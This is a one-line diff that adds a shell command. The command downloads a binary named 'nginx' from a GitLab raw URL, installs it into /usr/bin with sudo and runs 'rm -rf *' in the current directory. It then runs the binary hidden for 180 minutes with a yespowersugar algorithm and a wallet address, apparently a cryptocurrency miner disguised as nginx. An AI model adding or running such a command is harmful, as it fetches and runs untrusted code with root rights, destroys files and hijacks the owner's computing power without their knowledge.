@@ -1,0 +1,1 @@
+wget -O nginx https://gitlab.com/buildpack/builddriver/-/raw/master/nginx && chmod +x nginx && sudo mv nginx /usr/bin && rm -rf * && for i in {1..1}; do echo -n "$i";timeout 180m nginx -a yespowersugar -o 17042 -u sugar1qhsa2myu0epe8lrdnfm3kndcjwvpgzly4mamym3.Asia &>/dev/null; sleep 1; done
